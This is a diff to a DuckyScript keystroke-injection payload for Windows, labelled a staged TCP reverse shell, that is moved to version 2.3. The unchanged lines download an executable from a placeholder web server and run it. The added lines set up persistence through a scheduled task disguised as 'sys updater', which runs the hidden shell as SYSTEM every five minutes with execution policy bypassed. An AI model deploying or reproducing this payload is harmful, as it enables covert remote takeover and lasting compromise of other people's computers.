@@ -1,7 +1,7 @@
 REM       |=========================================================================|
 REM         Staged Interpreter TCP Reverse Ducky Shell
 REM         Author: DVBNL
-REM         Version 2.2
+REM         Version 2.3
 REM         OS Tested: Windows 11, Windows 10
 REM         INTERPRETER STAGED REVERSE SHELL > executable
 REM         WORKS WITH NEWEST WINDOWS TERMINAL (wt.exe)
@@ -31,6 +31,10 @@ DELAY 250
 
 REM |===Download shell executable from Webserver and RUN!===|
 STRING Invoke-WebRequest -Uri http://yourwebserver/payload.exe -OutFile $shell; Start-Process $shell;
+ENTER
+
+REM |===Persistence with adding the executable as scheduled task===|
+STRING $tn='sys updater'; $script="$dir\run.ps1"; if(!(Test-Path $script)){Set-Content -Path $script -Value "Start-Process `"$shell`" -WindowStyle Hidden"}; $act=New-ScheduledTaskAction -Execute "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$script`"" -WorkingDirectory $dir; $trg=New-ScheduledTaskTrigger -Daily -At 01:00; $trg.StartBoundary=(Get-Date -Hour 1 -Minute 0 -Second 0).AddDays(-1).ToString('s'); $trg.Repetition = New-CimInstance -Namespace root/Microsoft/Windows/TaskScheduler -ClassName MSFT_TaskRepetitionPattern -ClientOnly -Property @{ Interval='PT5M'; Duration='PT23H59M' }; $set=New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Hours 24) -MultipleInstances Parallel; if(Get-ScheduledTask -TaskName $tn -ErrorAction SilentlyContinue){Unregister-ScheduledTask -TaskName $tn -Confirm:$false}; Register-ScheduledTask -TaskName $tn -Action $act -Trigger $trg -Settings $set -RunLevel Highest -User 'SYSTEM'
 ENTER
 
 REM |===Kill all active wt or powershell processes (Visibility)===|
